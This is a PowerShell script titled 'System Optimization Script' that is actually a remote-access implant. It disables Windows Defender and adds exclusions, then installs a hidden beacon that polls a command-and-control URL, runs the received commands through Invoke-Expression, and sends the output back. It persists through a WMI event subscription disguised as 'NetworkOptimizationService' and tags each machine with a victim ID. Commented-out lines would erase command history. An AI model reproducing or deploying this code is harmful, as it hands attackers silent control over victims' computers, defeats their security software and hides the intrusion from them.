# System Optimization Script
$ErrorActionPreference = 'SilentlyContinue'

# Configuration - CHANGE THIS TO YOUR WORKER URL!
$C2_URL = 'https://readme.sharansahu1604.workers.dev'
$VICTIM_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})

# Log to file for debugging (optional - remove in production)
$LogFile = "$env:TEMP\sysopt.log"
"[$(Get-Date)] Starting installation..." | Out-File $LogFile

try {
    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null
    Set-MpPreference -EnableControlledFolderAccess Disabled -Force 2>$null
    Start-Sleep 2
    
    # Add exclusions
    $ExclusionPaths = @(
        'C:\ProgramData\Microsoft\Network',
        'C:\Windows\Temp',
        'C:\Users\Public',
        "$env:TEMP"
    )
    
    foreach ($path in $ExclusionPaths) {
        Add-MpPreference -ExclusionPath $path -Force 2>$null
    }
    
    Add-MpPreference -ExclusionProcess 'powershell.exe' -Force 2>$null
    
    "[$(Get-Date)] Defender disabled" | Out-File $LogFile -Append
    
    # Create beacon script
    $BeaconScript = @"
# Beacon Loop
`$C2_URL = '$C2_URL'
`$VICTIM_ID = '$VICTIM_ID'
`$LogFile = '$LogFile'

while (`$true) {
    try {
        "[`$(Get-Date)] Sending beacon..." | Out-File `$LogFile -Append
        
        `$headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            'X-Victim-ID' = `$VICTIM_ID
        }
        
        # Send beacon to C2
        `$response = Invoke-WebRequest -Uri "`$C2_URL/beacon" -Headers `$headers -UseBasicParsing -TimeoutSec 30
        `$cmd = `$response.Content
        
        "[`$(Get-Date)] Beacon sent, response: `$cmd" | Out-File `$LogFile -Append
        
        if (`$cmd -and `$cmd -ne 'idle') {
            "[`$(Get-Date)] Executing command: `$cmd" | Out-File `$LogFile -Append
            
            # Execute command
            `$output = Invoke-Expression `$cmd 2>&1 | Out-String
            
            "[`$(Get-Date)] Command output: `$output" | Out-File `$LogFile -Append
            
            # Send result back
            `$resultResponse = Invoke-WebRequest -Uri "`$C2_URL/result" -Method POST -Headers `$headers -Body `$output -UseBasicParsing -TimeoutSec 30
            
            "[`$(Get-Date)] Result sent" | Out-File `$LogFile -Append
        }
    } catch {
        "[`$(Get-Date)] Error: `$(`$_.Exception.Message)" | Out-File `$LogFile -Append
    }
    
    Start-Sleep 60
}
"@

    # Install beacon script
    $BeaconPath = 'C:\ProgramData\Microsoft\Network\netbeacon.ps1'
    $BeaconDir = Split-Path $BeaconPath
    
    if (!(Test-Path $BeaconDir)) {
        New-Item -ItemType Directory -Path $BeaconDir -Force | Out-Null
    }
    
    Set-Content -Path $BeaconPath -Value $BeaconScript -Force
    attrib +h +s $BeaconPath
    
    "[$(Get-Date)] Beacon script installed at: $BeaconPath" | Out-File $LogFile -Append
    
    # WMI Persistence
    $CMD = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    $FilterName = 'NetworkOptimizationService'
    $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    
    # Remove existing
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
    
    # Create new persistence
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = $FilterName
        EventNameSpace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = $Query
    }
    
    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = $FilterName
        CommandLineTemplate = $CMD
        RunInteractively = $false
    }
    
    $FilterObj = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq $FilterName}
    $ConsumerObj = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq $FilterName}
    
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $FilterObj
        Consumer = $ConsumerObj
    } | Out-Null
    
    "[$(Get-Date)] WMI persistence installed" | Out-File $LogFile -Append
    
    # Start beacon immediately (in background)
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`"" -WindowStyle Hidden
    
    "[$(Get-Date)] Beacon started" | Out-File $LogFile -Append
    
    # Clean traces (optional - commented out for debugging)
    # Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null
    # Clear-History 2>$null
    
    "[$(Get-Date)] Installation complete!" | Out-File $LogFile -Append
    Write-Host "Installation complete! Check $LogFile for details."
    
} catch {
    "[$(Get-Date)] FATAL ERROR: $($_.Exception.Message)" | Out-File $LogFile -Append
    Write-Host "Error: $($_.Exception.Message)"
}
